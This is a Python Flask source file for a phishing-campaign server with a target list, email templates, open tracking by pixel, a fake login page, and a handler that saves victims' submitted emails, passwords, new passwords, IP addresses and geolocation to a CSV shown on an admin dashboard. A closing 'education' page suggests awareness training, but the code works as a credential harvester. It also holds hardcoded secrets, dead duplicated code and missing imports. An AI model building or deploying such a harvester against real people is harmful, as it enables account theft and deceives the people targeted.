from flask import Flask, render_template, request, redirect, url_for, flash
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
import csv
import uuid
import os
import datetime
import requests
from core.campaign_processor import start_campaign



app = Flask(__name__)
app.secret_key = "rurye3erygd536rt"
auth = HTTPBasicAuth()

users = {
    "admin": generate_password_hash("313123") 
}


@auth.verify_password
def verify_password(username, password):
    if username in users and check_password_hash(users.get(username), password):
        return username

DATA_DIR = "data"
RESULTS_FILE = os.path.join(DATA_DIR, "victims.csv")
TEMPLATES_FILE = os.path.join(DATA_DIR, "templates.csv")
TARGETS_FILE = os.path.join(DATA_DIR, "targets.csv")
SMTP_FILE = os.path.join(DATA_DIR, "smtp_config.csv")


def init_db():
    if not os.path.exists(DATA_DIR): 
        os.makedirs(DATA_DIR)

    if not os.path.exists(SMTP_FILE):
        with open(SMTP_FILE, 'w', newline='', encoding='utf-8') as f:
            csv.writer(f).writerow(["host", "port", "username", "password"])

    files = {
        TARGETS_FILE: ["target_id", "name", "email", "department"],
        TEMPLATES_FILE: ["template_id", "subject", "body_html"],
        RESULTS_FILE: ["tracking_uuid", "campaign_id", "target_id", "is_opened", "is_clicked", "is_submitted"]
    }
    
    for path, headers in files.items():
        if not os.path.exists(path):
            with open(path, 'w', newline='', encoding='utf-8') as f:
                csv.writer(f).writerow(headers)
def update_csv_status(u_id, field):
    rows = []
    if not os.path.exists(RESULTS_FILE): return
    with open(RESULTS_FILE, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        fields = reader.fieldnames
        for row in reader:
            if row['tracking_uuid'] == u_id: row[field] = 'True'
            rows.append(row)
    with open(RESULTS_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=fields)
        writer.writeheader()
        writer.writerows(rows)



@app.route('/admin')
@auth.login_required
def admin_dashboard():
    stats = {'sent': 0, 'clicks': 0, 'compromised': 0, 'opened': 0}
    results_map = {}
    if os.path.exists(RESULTS_FILE):
        with open(RESULTS_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                u_id = row.get('tracking_uuid', '').strip()
                if u_id:
                    results_map[u_id] = row
                    results_map[u_id].update({
                        'timestamp': '-', 'captured_email': '-', 
                        'captured_password': '-', 'captured_NewPassword': '-',
                        'ip': '0.0.0.0', 'country': 'un', 'city': 'Unknown'
                    })
                    stats['sent'] += 1
                    if row.get('is_opened') == 'True': stats['opened'] += 1
                    if row.get('is_clicked') == 'True': stats['clicks'] += 1
    captured_file = os.path.join(DATA_DIR, "results.csv")
    if os.path.exists(captured_file):
        with open(captured_file, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for data in reader:
                c_id = data.get('uuid', '').strip()
                if c_id in results_map:
                    results_map[c_id].update({
                        'timestamp': data.get('timestamp', '-'),
                        'captured_email': data.get('email', '-'),
                        'captured_password': data.get('password', '-'),
                        'captured_NewPassword': data.get('NewPassword', '-'),
                        'ip': data.get('ip', '0.0.0.0'),
                        'country': data.get('country', 'un').lower(),
                        'city': data.get('city', 'Unknown')
                    })
    
    stats['compromised'] = sum(1 for r in results_map.values() if r.get('is_submitted') == 'True')
    return render_template('dashboard.html', results=list(results_map.values()), **stats)
    
    if os.path.exists(captured_file):
        with open(captured_file, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            reader.fieldnames = [field.strip() for field in reader.fieldnames] if reader.fieldnames else []
            
            accounted_uids = set()

            for data in reader:
                c_id = data.get('uuid', '').strip()
                if c_id in results_map:
                    results_map[c_id]['timestamp'] = data.get('timestamp', '-')
                    results_map[c_id]['captured_email'] = data.get('email', '-')
                    results_map[c_id]['captured_password'] = data.get('password', '-')
                    results_map[c_id]['captured_NewPassword'] = data.get('NewPassword', '-')
                    
                    if c_id not in accounted_uids:
                        stats['compromised'] += 1
                        accounted_uids.add(c_id)
                else:
                    print(f"Debug: UUID {c_id} found in results.csv but not in tracking records.")

    return render_template('dashboard.html', 
                           results=list(results_map.values()), 
                           **stats)




@app.route('/admin/smtp', methods=['GET', 'POST'])
@auth.login_required
def manage_smtp():
    if request.method == 'POST':
        host = request.form.get('host')
        port = request.form.get('port')
        user = request.form.get('username')
        pwd = request.form.get('password')

        with open(SMTP_FILE, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["host", "port", "username", "password"])
            writer.writerow([host, port, user, pwd])
        
        flash("success")
        return redirect(url_for('manage_smtp'))

    current_config = {}
    if os.path.exists(SMTP_FILE):
        with open(SMTP_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            current_config = next(reader, {})
            
    return render_template('manage_smtp.html', config=current_config)




@app.route('/admin/smtp/delete')
@auth.login_required
def delete_smtp():
    if os.path.exists(SMTP_FILE):
        with open(SMTP_FILE, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["host", "port", "username", "password"])
        flash("warning")
    return redirect(url_for('manage_smtp'))

@app.route('/admin/targets', methods=['GET', 'POST'])
@auth.login_required
def manage_targets():
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        dept = request.form.get('dept')
        
        target_id = f"T-{uuid.uuid4().hex[:4]}"
        

        with open(TARGETS_FILE, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([target_id, name, email, dept])
            
        flash(f"{name}", "success")
        return redirect(url_for('manage_targets'))

    targets = []
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, mode='r', encoding='utf-8') as f:
            targets = list(csv.DictReader(f))
            
    return render_template('manage_targets.html', targets=targets)




@app.route('/admin/delete-target/<target_id>')
@auth.login_required
def delete_target(target_id):
    rows = []
    found = False
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            fieldnames = reader.fieldnames
            for row in reader:
                if row['target_id'] != target_id:
                    rows.append(row)
                else:
                    found = True
        
        if found:
            with open(TARGETS_FILE, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(rows)
            flash("success", "warning")
    
    return redirect(url_for('manage_targets'))




@app.route('/track_open')
@auth.login_required
def track_open():
    u_id = request.args.get('id')
    if u_id:
        update_csv_status(u_id, 'is_opened')
    return send_file('static/pixel.png', mimetype='image/png')


@app.route('/admin/templates', methods=['GET', 'POST'])
@auth.login_required
def manage_templates():
    if request.method == 'POST':
        subject = request.form.get('subject')
        body = request.form.get('body')
        template_id = f"TMP-{uuid.uuid4().hex[:4]}"
        
        with open(TEMPLATES_FILE, 'a', newline='', encoding='utf-8') as f:
            csv.writer(f).writerow([template_id, subject, body])
        flash("success")
        return redirect(url_for('manage_templates'))

    templates = []
    if os.path.exists(TEMPLATES_FILE):
        with open(TEMPLATES_FILE, mode='r', encoding='utf-8') as f:
            templates = list(csv.DictReader(f))
    return render_template('manage_templates.html', templates=templates)




@app.route('/admin/new-campaign')
@auth.login_required
def new_campaign_form():
    templates = []
    if os.path.exists(TEMPLATES_FILE):
        with open(TEMPLATES_FILE, mode='r', encoding='utf-8') as f:
            templates = list(csv.DictReader(f))
    return render_template('new_campaign.html', templates=templates)




@app.route('/admin/create-campaign', methods=['POST'])
@auth.login_required
def handle_create_campaign():
    campaign_name = request.form.get('name')
    template_id = request.form.get('template_id')
    sender_name = request.form.get('sender_name')
    sender_email = request.form.get('sender_email')
    campaign_id = f"C-{uuid.uuid4().hex[:5]}"

    try:
        ngrok_data = requests.get('http://127.0.0.1:4040/api/tunnels').json()
        base_url = ngrok_data['tunnels'][0]['public_url']
    except:
        base_url = "http://127.0.0.1:7777"
    success = start_campaign(campaign_id, template_id, sender_name, sender_email, base_url=base_url)        
    
    if success:
        flash(f"{campaign_name}", "success")
    else:
        flash("error")
        
    return redirect(url_for('admin_dashboard'))




@app.route('/login')
def victim_click():
    u_id = request.args.get('id')
    if not u_id:
        abort(404)
    if u_id: update_csv_status(u_id, 'is_clicked')
    return render_template('fake_login.html', target_uuid=u_id)

@app.route('/submit-data', methods=['POST'])
def victim_submit():
    u_id = request.form.get('target_uuid')
    email = request.form.get('email')
    password = request.form.get('password')
    new_password = request.form.get('NewPassword')
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    country_code = "un"
    city = "Unknown"
    try:
        geo_data = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=2).json()
        if geo_data.get('status') == 'success':
            country_code = geo_data.get('countryCode').lower()
            city = geo_data.get('city')
    except:
        pass

    if u_id:
        update_csv_status(u_id, 'is_submitted')
        captured_file = os.path.join(DATA_DIR, "results.csv")
        file_exists = os.path.isfile(captured_file)
        
        with open(captured_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(["timestamp", "uuid", "email", "password", "NewPassword", "ip", "country", "city"])
            
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            writer.writerow([now, u_id, email, password, new_password, ip_address, country_code, city])

    return render_template('education.html')

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=7777)